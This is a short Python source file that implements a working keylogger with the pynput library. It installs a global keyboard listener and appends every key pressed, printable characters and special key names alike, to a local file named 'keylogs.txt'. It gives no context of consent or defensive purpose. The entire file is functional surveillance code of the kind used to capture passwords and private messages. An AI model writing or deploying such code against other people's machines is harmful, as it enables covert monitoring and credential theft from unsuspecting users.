from pynput.keyboard import Key, Listener
import logging

logdir = ""

logging.basicConfig(filename=(logdir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def onPress(key):
    with open(logdir + "keylogs.txt", "a") as f:
        try:
            # Check if the key represents a printable character
            char = key.char
        except AttributeError:
            # If not, use the key's name
            char = str(key)
        
        f.write(char + " ")

with Listener(on_press=onPress) as listener:
    listener.join()
